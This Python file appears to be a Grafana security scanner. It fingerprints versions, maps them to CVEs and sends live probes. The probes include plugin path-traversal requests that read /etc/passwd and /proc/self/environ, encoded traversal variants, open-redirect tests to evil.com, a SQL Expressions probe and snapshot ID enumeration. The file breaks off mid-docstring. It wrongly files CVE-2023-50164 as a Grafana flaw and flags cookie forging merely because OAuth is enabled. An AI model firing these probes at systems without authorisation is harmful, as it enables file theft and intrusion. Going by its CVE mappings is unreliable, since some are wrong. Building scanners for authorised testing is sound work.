#!/usr/bin/env python3


import argparse
import csv
import html
import json
import os
import re
import sys
import threading
import time
import concurrent.futures
from collections import defaultdict
from datetime import datetime
from io import StringIO
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import quote, urljoin, urlparse

import requests


def _positive_int(value: str) -> int:
    """Argument type validator for positive integers"""
    ivalue = int(value)
    if ivalue < 1:
        raise argparse.ArgumentTypeError(f"Minimum value is 1, got {value}")
    return ivalue


# Disable SSL warnings for testing environments
requests.packages.urllib3.disable_warnings()

# Terminal color codes for professional output
class Colors:
    # Severity levels
    CRITICAL = '\033[1;91m'    # Bold Bright Red
    HIGH = '\033[1;31m'        # Bold Red
    MEDIUM = '\033[1;33m'      # Bold Yellow
    LOW = '\033[1;36m'         # Bold Cyan
    INFO = '\033[1;94m'        # Bold Blue
    
    # Status indicators
    VULN = '\033[1;91m'        # Vulnerability found
    SAFE = '\033[1;92m'        # Safe/Passed
    WARN = '\033[1;93m'        # Warning
    
    # Text formatting
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    
    # Special
    HEADER = '\033[1;95m'      # Magenta for headers
    SUCCESS = '\033[1;92m'     # Green for success


class GrafanaFinalScanner:
    """
    Advanced Grafana Security Scanner
    
    Performs comprehensive security assessments of Grafana instances including:
    - CVE vulnerability detection with version validation
    - Configuration security analysis
    - Information disclosure checks
    - Authentication mechanism assessment
    - API key exposure detection
    - Security headers analysis
    """
    
    def __init__(self, timeout: int = 10, verify_ssl: bool = False, verbose: bool = False,
                 auth_token: Optional[str] = None, auth_user: Optional[str] = None,
                 auth_pass: Optional[str] = None, max_threads: int = 5):
        """
        Initialize the scanner with configuration parameters
        
        Args:
            timeout: HTTP request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
            verbose: Enable detailed logging output
            auth_token: Bearer token for authenticated endpoints
            auth_user: Username for basic authentication
            auth_pass: Password for basic authentication
            max_threads: Maximum threads for concurrent scanning
        """
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self.max_threads = max_threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # Configure authentication
        # Thread safety
        self._print_lock = threading.Lock()
        
        self._configure_auth(auth_token, auth_user, auth_pass)
        
        # Version detection cache
        self.grafana_version = None
        self.build_info = {}
        self.detected_plugins = []
        
        # Statistics
        self.stats = {
            'total_checks': 0,
            'vulnerabilities_found': 0,
            'checks_passed': 0,
            'errors': 0
        }
        
        # Rate limiting awareness
        self._rate_limited = False
        
    def _configure_auth(self, auth_token: Optional[str] = None,
                        auth_user: Optional[str] = None,
                        auth_pass: Optional[str] = None):
        """Configure authentication for the session"""
        if auth_token:
            self.session.headers.update({
                'Authorization': f'Bearer {auth_token}'
            })
            self.log("Bearer token authentication configured", "INFO")
        
        if auth_user and auth_pass:
            self.session.auth = (auth_user, auth_pass)
            self.log("Basic authentication configured", "INFO")
    
    def log(self, message: str, level: str = "INFO", indent: int = 0):
        """
        Enhanced logging with color coding and hierarchical indentation
        
        Args:
            message: The message to log
            level: Severity level (INFO, VULN, SAFE, WARN, etc.)
            indent: Indentation level for hierarchical output
        """
        timestamp = datetime.now().strftime("%H:%M:%S")
        indent_str = "  " * indent
        
        # Map level to color and symbol
        level_config = {
            'CRITICAL': (Colors.CRITICAL, '🔴', '[CRITICAL]'),
            'HIGH': (Colors.HIGH, '🟠', '[HIGH]'),
            'MEDIUM': (Colors.MEDIUM, '🟡', '[MEDIUM]'),
            'LOW': (Colors.LOW, '🔵', '[LOW]'),
            'INFO': (Colors.INFO, 'ℹ', '[INFO]'),
            'VULN': (Colors.VULN, '⚠️', '[VULN]'),
            'SAFE': (Colors.SAFE, '✓', '[SAFE]'),
            'WARN': (Colors.WARN, '⚡', '[WARN]'),
            'ERROR': (Colors.CRITICAL, '✗', '[ERROR]'),
            'SUCCESS': (Colors.SUCCESS, '✓', '[OK]'),
        }
        
        color, symbol, prefix = level_config.get(level, (Colors.RESET, '•', f'[{level}]'))
        
        if self.verbose:
            output = f"{Colors.DIM}[{timestamp}]{Colors.RESET} {indent_str}{symbol} {color}{prefix}{Colors.RESET} {message}"
        else:
            output = f"{indent_str}{symbol} {color}{prefix}{Colors.RESET} {message}"
        
        with self._print_lock:
            print(output)
    
    def _check_rate_limit(self, response) -> bool:
        """Check if we're being rate limited"""
        if response.status_code == 429:
            self._rate_limited = True
            return True
        # Check for common rate limit headers
        if response.headers.get('X-RateLimit-Remaining') == '0':
            self._rate_limited = True
            return True
        if response.headers.get('Retry-After'):
            self._rate_limited = True
            return True
        # Check for rate limit response body
        try:
            data = response.json()
            if isinstance(data, dict):
                msg = str(data.get('message', '') + data.get('error', '')).lower()
                if 'rate limit' in msg or 'too many requests' in msg:
                    self._rate_limited = True
                    return True
        except:
            pass
        return False
    
    def _safe_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """
        Safe HTTP request with retry and rate-limit handling
        
        Returns:
            Response object or None on failure
        """
        if self._rate_limited:
            self.log("Rate limited - skipping remaining requests", "WARN", 2)
            return None
        
        retries = 2
        for attempt in range(retries):
            try:
                kwargs.setdefault('timeout', self.timeout)
                kwargs.setdefault('verify', self.verify_ssl)
                kwargs.setdefault('allow_redirects', True)
                
                response = self.session.request(method, url, **kwargs)
                
                if self._check_rate_limit(response):
                    self.log("Rate limit detected - waiting before retry...", "WARN", 2)
                    time.sleep(5)
                    continue
                
                return response
                
            except requests.exceptions.Timeout:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                if self.verbose:
                    self.log(f"Request timeout: {url}", "INFO", 3)
            except requests.exceptions.ConnectionError as e:
                if self.verbose:
                    self.log(f"Connection error: {str(e)}", "INFO", 3)
                return None
            except Exception as e:
                if self.verbose:
                    self.log(f"Request error: {str(e)}", "INFO", 3)
                return None
        
        return None
    
    def detect_grafana_version(self, base_url: str) -> Optional[str]:
        """
        Multi-source version detection with fallback strategies
        
        Attempts to detect Grafana version from:
        1. /api/frontend/settings (buildInfo)
        2. /api/health endpoint
        3. Login page metadata
        4. Build artifacts
        5. Error pages
        6. API response headers
        
        Returns:
            Version string (e.g., "11.2.0") or None if detection fails
        """
        self.log("Initiating version fingerprinting...", "INFO", 1)
        
        detection_methods = [
            {
                'endpoint': '/api/frontend/settings',
                'method': 'GET',
                'parser': self._parse_frontend_settings
            },
            {
                'endpoint': '/api/health',
                'method': 'GET',
                'parser': self._parse_health_endpoint
            },
            {
                'endpoint': '/login',
                'method': 'GET',
                'parser': self._parse_login_page
            },
            {
                'endpoint': '/api/org',
                'method': 'GET',
                'parser': self._parse_api_response
            },
            {
                'endpoint': '/api/user/signup',
                'method': 'GET',
                'parser': self._parse_api_response
            },
            {
                'endpoint': '/api/annotations',
                'method': 'GET',
                'parser': self._parse_version_header_only
            },
            {
                'endpoint': '/grafana/api/dashboards/home',
                'method': 'GET',
                'parser': self._parse_api_response
            }
        ]
        
        for method_config in detection_methods:
            try:
                url = urljoin(base_url, method_config['endpoint'])
                response = self._safe_request(
                    method_config['method'],
                    url,
                    allow_redirects=True
                )
                
                if response and response.status_code == 200:
                    version = method_config['parser'](response)
                    if version:
                        self.grafana_version = version
                        self.log(f"Version detected: {Colors.BOLD}Grafana v{version}{Colors.RESET}", "SUCCESS", 1)
                        return version
                        
            except Exception as e:
                if self.verbose:
                    self.log(f"Method {method_config['endpoint']} failed: {str(e)}", "INFO", 2)
                continue
        
        self.log("Version detection unsuccessful - proceeding with comprehensive scan", "WARN", 1)
        return None
    
    def _parse_frontend_settings(self, response) -> Optional[str]:
        """Parse version from /api/frontend/settings"""
        try:
            data = response.json()
            if 'buildInfo' in data and 'version' in data['buildInfo']:
                self.build_info = data['buildInfo']
                return data['buildInfo']['version']
        except:
            pass
        return None
    
    def _parse_health_endpoint(self, response) -> Optional[str]:
        """Parse version from /api/health"""
        try:
            data = response.json()
            if 'version' in data:
                return data['version']
        except:
            pass
        return None
    
    def _parse_login_page(self, response) -> Optional[str]:
        """Parse version from login page HTML/JavaScript"""
        try:
            # Look for version in various JavaScript variables
            patterns = [
                r'"(?:version|grafanaVersion)"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+(?:\-beta\d+)?)"',
                r'window\.grafanaBootData\s*=\s*{[^}]*"version"\s*:\s*"([0-9.]+)"',
                r'window\.GrafanaBootData\s*=',
                r'Grafana\s+v([0-9]+\.[0-9]+\.[0-9]+)',
                r'data-grafana-version="([0-9.]+)"',
                r'"buildVersion"\s*:\s*"([^"]+)"',
                r'"gitVersion"\s*:\s*"([^"]+)"',
                r'"grafana_version"\s*:\s*"([^"]+)"',
                r'<meta\s+name="grafana-version"\s+content="([^"]+)"',
            ]
            
            for pattern in patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    return match.group(1)
        except:
            pass
        return None
    
    def _parse_api_response(self, response) -> Optional[str]:
        """Parse version from generic API responses"""
        try:
            # Check headers
            version_header = self._parse_version_header_only(response)
            if version_header:
                return version_header
            
            # Check JSON response
            data = response.json()
            if isinstance(data, dict):
                for key in ['version', 'buildVersion', 'grafanaVersion']:
                    if key in data and isinstance(data[key], str):
                        if re.match(r'^[0-9]+\.[0-9]+', data[key]):
                            return data[key]
        except:
            pass
        return None
    
    def _parse_version_header_only(self, response) -> Optional[str]:
        """Parse version from response headers only"""
        try:
            for header in ['X-Grafana-Version', 'X-Grafana-Build-Version']:
                if header in response.headers:
                    version = response.headers[header]
                    if re.match(r'^[0-9]+\.[0-9]+', version):
                        return version
        except:
            pass
        return None
    
    def compare_versions(self, version_a: str, version_b: str) -> int:
        """
        Compare two version strings
        Returns: -1 if a < b, 0 if a == b, 1 if a > b
        """
        def parse_version(v: str) -> List[int]:
            # Remove pre-release tags for comparison
            v = re.sub(r'[-_].*$', '', v)
            parts = []
            for part in v.split('.'):
                try:
                    parts.append(int(part))
                except ValueError:
                    parts.append(0)
            while len(parts) < 3:
                parts.append(0)
            return parts[:3]
        
        a_parts = parse_version(version_a)
        b_parts = parse_version(version_b)
        
        for i in range(3):
            if a_parts[i] < b_parts[i]:
                return -1
            elif a_parts[i] > b_parts[i]:
                return 1
        return 0
    
    def version_in_range(self, version: str, min_v: Optional[str] = None, max_v: Optional[str] = None) -> bool:
        """
        Check if version is within a range (inclusive)
        """
        if not version:
            return False
        
        if min_v and self.compare_versions(version, min_v) < 0:
            return False
        
        if max_v and self.compare_versions(version, max_v) > 0:
            return False
        
        return True
    
    def is_version_vulnerable(self, cve_id: str) -> bool:
        """
        Determine if detected version is vulnerable to specific CVE
        
        Uses version range mapping and special case handling for each CVE
        
        Args:
            cve_id: CVE identifier (e.g., "CVE-2021-43798")
            
        Returns:
            True if vulnerable or version unknown, False if patched
        """
        if not self.grafana_version:
            return True  # Unknown version = assume vulnerable for thoroughness
        
        try:
            v = self.grafana_version
            
            # CVE-specific version checks using range-based approach
            vulnerability_matrix = {
                'CVE-2025-4123': lambda: (
                    self.compare_versions(v, '12.0.0') < 0
                ),
                'CVE-2024-9264': lambda: (
                    self.version_in_range(v, '11.0.0', '11.0.5') or
                    self.version_in_range(v, '11.1.0', '11.1.6') or
                    self.version_in_range(v, '11.2.0', '11.2.1')
                ),
                'CVE-2021-43798': lambda: (
                    self.version_in_range(v, '8.0.0', '8.3.0')
                ),
                'CVE-2022-32275': lambda: v == '8.4.3',
                'CVE-2022-32276': lambda: v == '8.4.3',
                'CVE-2021-27358': lambda: (
                    self.version_in_range(v, '6.7.3', '7.4.1')
                ),
                'CVE-2020-11110': lambda: self.compare_versions(v, '6.7.0') < 0,
                'CVE-2021-41174': lambda: (
                    self.compare_versions(v, '8.0.0') >= 0 and
                    self.compare_versions(v, '8.3.0') <= 0
                ),
                'CVE-2021-39226': lambda: (
                    self.compare_versions(v, '8.0.0') >= 0 and
                    self.compare_versions(v, '8.3.0') <= 0
                ),
                'CVE-2018-15727': lambda: (
                    self.compare_versions(v, '5.2.2') <= 0
                ),
                'CVE-2023-50164': lambda: (
                    self.version_in_range(v, '0.0.0', '9.2.9') or
                    self.version_in_range(v, '9.3.0', '9.3.5') or
                    self.version_in_range(v, '9.4.0', '9.4.0')
                ),
                'CVE-2023-1410': lambda: (
                    self.compare_versions(v, '8.0.0') >= 0 and (
                        self.version_in_range(v, '8.0.0', '9.2.16') or
                        self.version_in_range(v, '9.3.0', '9.3.4')
                    )
                ),
                'CVE-2023-2183': lambda: (
                    (v.startswith('8.') and self.compare_versions(v, '8.5.21') < 0) or
                    (v.startswith('9.') and self.compare_versions(v, '9.4.13') < 0)
                ),
                'CVE-2024-1313': lambda: (
                    self.version_in_range(v, '8.0.0', '8.5.17') or
                    self.version_in_range(v, '9.0.0', '9.2.14') or
                    self.version_in_range(v, '9.3.0', '9.3.11') or
                    self.version_in_range(v, '9.4.0', '9.4.10') or
                    self.version_in_range(v, '9.5.0', '9.5.6')
                ),
                'CVE-2024-8118': lambda: (
                    self.version_in_range(v, '11.0.0', '11.0.5') or
                    self.version_in_range(v, '11.1.0', '11.1.7') or
                    self.version_in_range(v, '11.2.0', '11.2.1')
                )
            }
            
            check_func = vulnerability_matrix.get(cve_id)
            if check_func:
                return check_func()
                
        except Exception as e:
            if self.verbose:
                self.log(f"Version check error for {cve_id}: {str(e)}", "WARN", 2)
        
        return True  # Default to vulnerable if uncertain
    
    def check_cve_2021_43798(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2021-43798: Directory Traversal - Arbitrary File Read
        
        Vulnerability: Path traversal in plugin static file serving
        Affected: Grafana 8.0.0-beta1 through 8.3.0
        Severity: CRITICAL (CVSS 7.5)
        Impact: Unauthenticated arbitrary file read
        
        Detection: Attempts to read /etc/passwd via plugin path traversal
        Validation: Requires multiple Unix password file indicators
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2021-43798'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} patched against directory traversal", base_url
        
        # Expanded plugin list - includes all default and common plugins
        test_plugins = [
            'alertlist', 'annolist', 'barchart', 'bargauge', 'candlestick',
            'cloudwatch', 'dashboard', 'elasticsearch', 'gauge', 'geomap',
            'graph', 'graphite', 'heatmap', 'histogram', 'influxdb',
            'jaeger', 'loki', 'mssql', 'mysql', 'news',
            'nodeGraph', 'opentsdb', 'piechart', 'pluginlist', 'postgres',
            'prometheus', 'stat', 'state-timeline', 'status-history',
            'table', 'table-old', 'tempo', 'testdata', 'text',
            'timeseries', 'welcome', 'zipkin'
        ]
        
        # Read multiple files to confirm traversal
        test_files = [
            "../" * 8 + "etc/passwd",
            "../" * 8 + "etc/hostname",
            "../" * 8 + "proc/self/environ",
        ]
        
        for plugin in test_plugins:
            for traversal_path in test_files:
                try:
                    endpoint = f"/public/plugins/{plugin}/{traversal_path}"
                    test_url = urljoin(base_url, endpoint)
                    
                    response = self._safe_request('GET', test_url, allow_redirects=False)
                    
                    if response and response.status_code == 200:
                        content = response.text
                        content_lower = content.lower()
                        
                        # Strict validation - must contain multiple Unix passwd indicators
                        indicators_found = 0
                        required_indicators = [
                            ('root:', 'Root user entry'),
                            ('/bin/', 'Shell path'),
                            (':x:', 'Password placeholder'),
                            ('daemon:', 'System daemon user'),
                            ('/usr/', 'User directory path'),
                            ('/sbin/', 'System binary path'),
                            ('nobody:', 'Nobody user entry'),
                            ('/etc/', 'Configuration path')
                        ]
                        
                        for indicator, description in required_indicators:
                            if indicator in content_lower:
                                indicators_found += 1
                        
                        # Require at least 3 indicators to confirm
                        # Also check content length is reasonable for a passwd file (200+ chars)
                        if indicators_found >= 3 and len(content) > 100:
                            self.stats['vulnerabilities_found'] += 1
                            return True, (
                                f"Directory traversal CONFIRMED - File read via '{plugin}' plugin "
                                f"({indicators_found}/{len(required_indicators)} indicators, "
                                f"{len(content)} bytes)"
                            ), test_url
                        
                        # If we got a 200 but not enough indicators for passwd, try checking if 
                        # it's actually reading a different file (false positive indication)
                        if response.status_code == 200 and len(content) < 50:
                            # Likely a default file or empty response, not a real traversal
                            continue
                            
                except Exception:
                    continue
        
        self.stats['checks_passed'] += 1
        return False, "Directory traversal blocked - file read protection active", base_url
    
    def check_cve_2025_4123(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2025-4123: "Grafana Ghost" - Path Traversal & Open Redirect XSS
        
        Vulnerability: Multiple issues in /public and /redirect endpoints
        Affected: All versions before security patches
        Severity: CRITICAL (CVSS 8.2)
        Impact: XSS, account takeover, SSRF
        
        Detection: Tests for unvalidated redirects and path traversal
        Validation: Confirms actual external domain redirection
        """
        self.stats['total_checks'] += 1
        
        test_vectors = [
            {
                'path': '/redirect',
                'params': {'url': 'http://external-test-domain.example.com'},
                'type': 'open_redirect'
            },
            {
                'path': '/redirect',
                'params': {'url': '//evil.com/test'},
                'type': 'open_redirect_protocol_relative'
            },
            {
                'path': '/public/plugins/test/../../../',
                'params': {},
                'type': 'path_traversal'
            },
            {
                'path': '/public/build/../../../',
                'params': {},
                'type': 'path_traversal_build'
            },
            {
                'path': '/api/frontend/settings',
                'params': {},
                'type': 'info_disclosure'
            },
            {
                'path': '/login',
                'params': {'redirect': 'http://evil.com'},
                'type': 'redirect_param'
            },
            {
                'path': '/api/snapshots',
                'params': {},
                'type': 'snapshot_access'
            }
        ]
        
        vulnerabilities = []
        
        for vector in test_vectors:
            try:
                if vector['params']:
                    query_string = '&'.join([f"{k}={v}" for k, v in vector['params'].items()])
                    test_url = urljoin(base_url, vector['path']) + '?' + query_string
                else:
                    test_url = urljoin(base_url, vector['path'])
                
                response = self._safe_request('GET', test_url, allow_redirects=False)
                
                if not response:
                    continue
                
                if vector['type'] in ['open_redirect', 'open_redirect_protocol_relative']:
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if location:
                            # Validate external redirect
                            parsed_location = urlparse(location)
                            parsed_base = urlparse(base_url)
                            
                            # Check for protocol-relative redirects
                            if vector['type'] == 'open_redirect_protocol_relative' and location.startswith('//'):
                                vulnerabilities.append(f"Protocol-relative redirect to: {location}")
                                continue
                            
                            if parsed_location.netloc and parsed_base.netloc != parsed_location.netloc:
                                vulnerabilities.append(f"Open redirect to external domain: {parsed_location.netloc}")
                
                elif vector['type'] == 'redirect_param':
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if 'evil.com' in location or 'http' in location:
                            vulnerabilities.append("Open redirect via login redirect parameter")
                
                elif vector['type'] in ['path_traversal', 'path_traversal_build']:
                    if response.status_code == 200:
                        content = response.text.lower()
                        # Check for actual /etc/passwd file content indicators
                        # Avoid generic terms like 'grafana' or 'httpd' that appear on any page
                        path_indicators = ['root:', ':x:', '/bin/bash', 'daemon:', 'nobody:']
                        indicator_matches = sum(1 for ind in path_indicators if ind in content)
                        if indicator_matches >= 2 and len(content) > 300:
                            vulnerabilities.append(f"Possible path traversal ({indicator_matches} indicators, {len(content)} bytes)")
                
                elif vector['type'] == 'info_disclosure':
                    try:
                        data = response.json()
                        if isinstance(data, dict) and ('buildInfo' in data or 'oauth' in data):
                            if 'oauth' in data and data['oauth']:
                                vulnerabilities.append("OAuth configuration exposed via frontend settings")
                    except:
                        pass
                
                elif vector['type'] == 'snapshot_access':
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if isinstance(data, list) and len(data) > 0:
                                # Check for sensitive snapshot data (non-public indicators)
                                has_deleted_snapshots = any(
                                    s.get('deleteKey') or s.get('deleteUrl') 
                                    for s in data if isinstance(s, dict)
                                )
                                if has_deleted_snapshots:
                                    vulnerabilities.append(f"Snapshot list accessible with delete keys ({len(data)} snapshots)")
                        except:
                            pass
                            
            except Exception:
                continue
        
        if vulnerabilities:
            self.stats['vulnerabilities_found'] += 1
            return True, " | ".join(vulnerabilities), base_url + '/' + vector['path']
        
        self.stats['checks_passed'] += 1
        return False, "Redirect validation and path sanitization active", base_url
    
    def check_cve_2024_9264(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2024-9264: DuckDB SQL Injection
        
        Vulnerability: SQL injection in experimental SQL Expressions feature
        Affected: Grafana 11.0.0-11.0.5, 11.1.0-11.1.6, 11.2.0-11.2.1
        Severity: CRITICAL (CVSS 9.0+)
        Impact: RCE, arbitrary file read (requires DuckDB binary)
        
        Detection: Tests for SQL Expressions endpoint availability
        Note: Requires authentication - reports as info only
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2024-9264'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} not affected by SQL injection", base_url
        
        # Test multiple endpoints for SQL Expressions
        test_endpoints = [
            '/api/ds/query',
            '/api/tsdb/query',
            '/api/query'
        ]
        
        for endpoint in test_endpoints:
            test_url = urljoin(base_url, endpoint)
            
            try:
                # Probe for endpoint existence with SQL expression payload
                test_payload = {
                    "queries": [{
                        "refId": "A",
                        "datasource": {"type": "__expr__", "uid": "__expr__"},
                        "type": "sql",
                        "expression": "SELECT 1"
                    }],
                    "from": "now-1h",
                    "to": "now"
                }
                
                response = self._safe_request('POST', test_url, json=test_payload)
                
                if not response:
                    continue
                
                if response.status_code in [401, 403]:
                    self.stats['checks_passed'] += 1
                    return False, "SQL Expressions require authentication - remote testing not possible", test_url
                elif response.status_code == 200:
                    # Endpoint exists, check if it actually processed the SQL expression
                    try:
                        data = response.json()
                        if isinstance(data, dict) and 'results' in data:
                            self.stats['vulnerabilities_found'] += 1
                            return True, "SQL Expressions endpoint accessible and responding", test_url
                    except:
                        pass
                    # Endpoint exists but might need DuckDB binary
                    self.stats['checks_passed'] += 1
                    return False, "SQL Expressions available (exploitability requires DuckDB binary installation)", test_url
                    
            except Exception:
                continue
        
        self.stats['checks_passed'] += 1
        return False, "SQL Expressions endpoint not available or removed", base_url
    
    def check_cve_2018_15727(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2018-15727: Authentication Bypass via Cookie Forging
        
        Vulnerability: Predictable "remember me" cookie generation
        Affected: Grafana 2.x-3.x, 4.x < 4.6.4, 5.x < 5.2.3
        Severity: HIGH (CVSS 8.1)
        Impact: Account takeover for LDAP/OAuth users
        
        Detection: Identifies LDAP/OAuth authentication mechanisms via API
        Validation: Checks for actual auth configuration endpoints, not keywords
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2018-15727'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} has secure cookie generation", base_url
        
        # Check actual auth configuration endpoints
        auth_endpoints = [
            '/api/ldap/settings',
            '/api/ldap/status',
            '/api/oauth2/settings',
            '/api/auth/saml/settings',
            '/api/frontend/settings'
        ]
        
        detected_auth = []
        
        for endpoint in auth_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                response = self._safe_request('GET', test_url)
                
                if not response:
                    continue
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, dict):
                            if 'enabled' in data and data['enabled']:
                                if 'ldap' in endpoint:
                                    detected_auth.append('LDAP')
                                elif 'oauth' in endpoint:
                                    detected_auth.append('OAuth')
                                elif 'saml' in endpoint:
                                    detected_auth.append('SAML')
                            # Check frontend settings for oauth providers
                            if endpoint == '/api/frontend/settings':
                                oauth_providers = [
                                    'oauth', 'oauth2', 'google_auth', 'github_auth', 
                                    'azure_auth', 'generic_oauth', 'grafana_com_auth'
                                ]
                                for provider in oauth_providers:
                                    if provider in str(data).lower():
                                        if 'OAuth' not in detected_auth:
                                            detected_auth.append('OAuth')
                                        break
                    except:
                        pass
                        
            except Exception:
                continue
        
        if detected_auth:
            self.stats['vulnerabilities_found'] += 1
            auth_methods = ' & '.join(set(detected_auth))
            return True, f"{auth_methods} authentication enabled - vulnerable to cookie forging attack", base_url
        
        self.stats['checks_passed'] += 1
        return False, "No LDAP/OAuth/SAML configuration detected", base_url
    
    def check_cve_2021_39226(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2021-39226: Snapshot Enumeration
        
        Vulnerability: Predictable snapshot IDs allow enumeration
        Affected: Multiple versions
        Severity: MEDIUM (CVSS 6.5)
        Impact: Unauthorized access to dashboard snapshots
        
        Detection: Tests multiple snapshot IDs for accessibility
        Validation: Requires valid JSON snapshot data in response
        """
        self.stats['total_checks'] += 1
        
        # Test a wider range of IDs to reduce false negatives
        test_ids = list(range(1, 51))  # Test IDs 1-50
        accessible_snapshots = 0
        accessible_ids = []
        last_test_url = base_url
        
        for snapshot_id in test_ids:
            endpoints = [
                f"/api/snapshots/{snapshot_id}",
                f"/dashboard/snapshot/{snapshot_id}",
                f"/api/snapshots/delete/{snapshot_id}",
                f"/api/snapshots/shared/{snapshot_id}"
            ]
            
            for endpoint in endpoints:
                try:
                    test_url = urljoin(base_url, endpoint)
                    last_test_url = test_url
                    
                    response = self._safe_request('GET', test_url)
                    
                    if not response:
                        continue
                    
                    if response.status_code == 200:
                        # Validate it's actually a snapshot, not error page
                        try:
                            data = response.json()
                            if isinstance(data, dict):
                                # Check for snapshot indicators in JSON
                                if any(key in data for key in ['dashboard', 'meta', 'snapshot', 'snapshotId', 'name', 'expires']):
                                    accessible_snapshots += 1
                                    accessible_ids.append(snapshot_id)
                                    break
                        except:
                            # HTML response - check for snapshot indicators
                            content_lower = response.text.lower()
                            snapshot_indicators = ['snapshot', 'dashboard', 'created', 'expire']
                            indicator_count = sum(1 for ind in snapshot_indicators if ind in content_lower)
                            if indicator_count >= 2 and len(response.text) > 200:
                                accessible_snapshots += 1
                                accessible_ids.append(snapshot_id)
                                break
                                
                except Exception:
                    continue
            
            # Limit concurrent checks to avoid overwhelming the target
            if snapshot_id % 10 == 0:
                time.sleep(0.1)
        
        if accessible_snapshots > 0:
            self.stats['vulnerabilities_found'] += 1
            return True, (
                f"Snapshot enumeration confirmed - {accessible_snapshots}/{len(test_ids)} test IDs accessible. "
                f"Sample accessible IDs: {accessible_ids[:5]}"
            ), last_test_url
        
        self.stats['checks_passed'] += 1
        return False, "Snapshots protected or enumeration blocked", base_url
    
    def check_cve_2023_50164(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2023-50164: Path Traversal via Plugin Files
        
        Vulnerability: Path traversal in plugin file handling
        Affected: Grafana < 9.2.10, < 9.3.6, < 9.4.1
        Severity: HIGH (CVSS 8.0)
        Impact: Arbitrary file read via plugin static resources
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2023-50164'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} not affected", base_url
        
        # Test plugin file traversal with various encodings
        traversal_patterns = [
            "../" * 8 + "etc/passwd",
            "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
            "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//....//....//etc/passwd",
        ]
        
        plugins_to_test = ['alertlist', 'graph', 'table', 'prometheus', 'loki']
        
        for plugin in plugins_to_test:
            for pattern in traversal_patterns:
                try:
                    endpoint = f"/api/plugins/{plugin}/resources/{pattern}"
                    test_url = urljoin(base_url, endpoint)
                    
                    response = self._safe_request('GET', test_url, allow_redirects=False)
                    
                    if response and response.status_code == 200:
                        content = response.text.lower()
                        indicators = ['root:', ':x:', '/bin/bash', 'daemon:', 'nobody:']
                        matches = sum(1 for ind in indicators if ind in content)
                        
                        if matches >= 2 and len(response.text) > 100:
                            self.stats['vulnerabilities_found'] += 1
                            return True, (
                                f"Plugin path traversal CONFIRMED via '{plugin}' plugin "
                                f"using encoding: {pattern[:30]}... ({matches}/{len(indicators)} indicators)"
                            ), test_url
                            
                except Exception:
                    continue
        
        self.stats['checks_passed'] += 1
        return False, "Plugin path traversal protection active", base_url
    
    def check_cve_2023_1410(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2023-1410: SSRF via Data Source Proxy
        
        Vulnerability: Server-Side Request Forgery through data source proxy
        Affected: Grafana >= 8.0.0, < 9.2.17, < 9.3.5
        Severity: HIGH (CVSS 8.8)
        Impact: Internal network scanning, cloud metadata access
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2023-1410'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} not affected", base_url
        
        # Check for SSRF-vulnerable endpoints
        ssrf_endpoints = [
            '/api/datasources/proxy/',
            '/api/ds/proxy/',
            '/api/plugin-proxy/',
            '/api/datasources/proxy/1/',
        ]
        
        for endpoint in ssrf_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                response = self._safe_request('GET', test_url, allow_redirects=False)
                
                if not response:
                    continue
                
                # Only 200 indicates the proxy endpoint itself is accessible
                # 404 could be from the reverse proxy or web framework, not Grafana specifically
                if response.status_code == 200:
                    self.stats['vulnerabilities_found'] += 1
                    return True, (
                        f"Data source proxy endpoint accessible: {endpoint} (HTTP 200). "
                        f"Potential SSRF vector - requires authenticated datasource to exploit fully."
                    ), test_url
                elif response.status_code == 404:
                    # 404 alone is not conclusive - could be Grafana's router or an upstream proxy
                    if self.verbose:
                        self.log(f"{endpoint} returned 404 (inconclusive - may not be Grafana's DS proxy)", "INFO", 2)
                    
            except Exception:
                continue
        
        self.stats['checks_passed'] += 1
        return False, "Data source proxy protected or not exposed", base_url
    
    def check_cve_2023_2183(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2023-2183: Authentication Bypass via API
        
        Vulnerability: Authentication bypass in API access control
        Affected: Specific versions (8.x, 9.x before patches)
